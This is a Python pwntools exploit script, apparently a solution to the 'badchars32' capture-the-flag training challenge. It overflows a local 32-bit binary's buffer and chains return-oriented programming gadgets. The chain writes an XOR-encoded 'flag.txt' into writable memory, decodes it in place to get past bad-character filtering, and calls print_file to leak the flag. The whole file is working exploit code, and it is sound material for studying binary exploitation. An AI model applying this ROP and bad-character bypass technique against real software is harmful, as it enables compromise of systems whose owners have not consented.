from pwn import *

data = 0x0804a018 # rw-
print_file = 0x080483d0 # plt
mov_dword = 0x0804854f # mov dword ptr [edi], esi ; ret
pop_ebx_esi_edi_ebp = 0x080485b8 # pop ebx ; pop esi ; pop edi ; pop ebp ; ret
pop_esi_edi_ebp = 0x080485b9 # pop esi ; pop edi ; pop ebp ; ret
pop_ebp = 0x080485bb # pop ebp ; ret
xor = 0x08048547 # xor byte ptr [ebp], bl ; ret
key = 0x2
flag = bytes([ i^key for i in b"flag.txt" ])

#print(flag)

# Writing encoded filename
payload = b"".join([
    b"A"*(32+12),
    p32(pop_esi_edi_ebp),
    flag[:4],
    p32(data),
    b"B"*4,
    p32(mov_dword),
    p32(pop_esi_edi_ebp),
    flag[4:],
    p32(data+4),
    b"C"*4,
    p32(mov_dword),
])

# Decoding filename
payload += b"".join([
    p32(pop_ebx_esi_edi_ebp),
    p32(key),
    b"D"*8,
    p32(data),
    p32(xor),
])
for i in range(1,len(flag)):
    payload += b"".join([
        p32(pop_ebp),
        p32(data+i),
        p32(xor),
    ])

# Call print_file
payload += b"".join([
    p32(print_file),
    b"E"*4,
    p32(data),
])

p = process("./badchars32")
#input("Waiting for debug")
p.send(payload+b"\n")

#p.interactive()
p.recvuntil(b"you!\n")
flag = p.recv()
print(f"Flag : {flag}")
